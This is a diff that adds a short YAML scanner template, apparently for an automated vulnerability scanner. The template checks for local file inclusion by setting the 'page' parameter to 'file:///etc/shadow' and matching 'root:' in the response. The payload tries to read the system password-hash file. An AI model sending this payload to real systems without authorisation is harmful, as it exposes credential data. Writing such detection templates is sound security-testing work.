@@ -1,0 +1,20 @@
+id: lfi5-033
+name: 'Wrapper file via page'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - wrapper
+description: 'Reads file via file wrapper'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      page:
+        - 'file:///etc/shadow'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:'
